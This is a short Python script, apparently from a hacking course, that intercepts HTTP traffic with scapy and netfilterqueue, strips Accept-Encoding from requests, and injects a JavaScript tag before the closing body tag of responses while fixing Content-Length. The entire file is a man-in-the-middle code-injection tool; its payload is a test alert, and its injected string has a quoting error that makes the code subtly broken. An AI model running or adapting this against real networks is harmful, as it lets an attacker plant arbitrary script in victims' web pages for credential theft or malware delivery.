#! /usr/bin/env python3
"""A simple script used to inject code.
   Script uses Python 3"""

import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    """Processes the packet and processes payload."""
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')
            load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Response')
            injection_code = '<script>alert(\'test\);</script>'
            #Replaces the closing body tag in the HTML file with a JavaScript alert and new closing body tag
            load = load.replace('</body>', injection_code + '</body>')
            # matches string Content-Length <some number>, extracting only the number
            content_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
            if content_length_search:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
